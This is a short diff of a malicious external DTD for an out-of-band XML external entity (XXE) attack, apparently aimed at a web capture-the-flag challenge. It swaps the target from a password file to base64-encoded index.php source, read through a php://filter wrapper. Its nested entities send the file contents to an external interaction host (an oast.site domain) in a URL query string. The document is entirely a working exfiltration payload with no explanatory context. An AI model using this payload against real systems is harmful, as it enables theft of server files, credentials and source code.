@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///challenge/web-serveur/ch29/password">
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
 <!ENTITY % eval "<!ENTITY &#x25; xvv SYSTEM &#x22;https://y34o1d4ulp5sig2bhb9k369rv1hwpham8.oast.site/?x=%file;&#x22;>">
 %eval;
 %xvv;
